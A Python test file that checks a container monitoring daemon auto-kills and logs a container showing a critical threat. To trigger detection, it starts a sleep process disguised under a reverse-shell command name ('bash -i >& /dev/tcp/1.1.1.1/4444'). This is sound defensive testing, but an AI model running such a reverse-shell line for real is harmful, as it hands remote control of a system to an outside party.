"""Test automated threat response system."""

import subprocess
import time

import pytest

from support.monitoring import (
    cleanup_container,
    container_absent,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_critical_threat_kills_container(test_workspace, enable_monitoring, coi_binary):
    """Verify CRITICAL threats trigger auto-kill."""
    proc = subprocess.Popen(
        [coi_binary, "shell", "--workspace", test_workspace, "--slot", "3", "--debug"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-3"

    if not wait_for_container_running(container_name, timeout=30):
        proc.terminate()
        pytest.skip(f"Container {container_name} not found or not running")

    # Wait for monitoring baseline to stabilize
    time.sleep(10)

    # Trigger CRITICAL threat
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'bash -i >& /dev/tcp/1.1.1.1/4444' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Give the monitoring daemon a moment to scan before polling state.
    time.sleep(5)

    # Wait for auto-kill
    killed = False
    for _ in range(15):
        time.sleep(1)
        if container_absent(container_name):
            killed = True
            break

    assert killed, (
        "Container should be auto-killed (stopped AND deleted) on CRITICAL threat, "
        f"but it still exists as {get_container_state(container_name)!r}"
    )

    # The daemon writes the kill event and syncs to disk before killing the
    # container, but retry briefly in case of OS-level flush delay.
    killed_events = []
    for _ in range(10):
        events = get_threat_events(container_name)
        killed_events = [e for e in events if e.get("action") == "killed"]
        if killed_events:
            break
        time.sleep(1)
    assert len(killed_events) > 0, (
        f"Expected action='killed' in audit log. Events: {get_threat_events(container_name)}"
    )

    proc.terminate()
    cleanup_container(container_name, coi_binary)
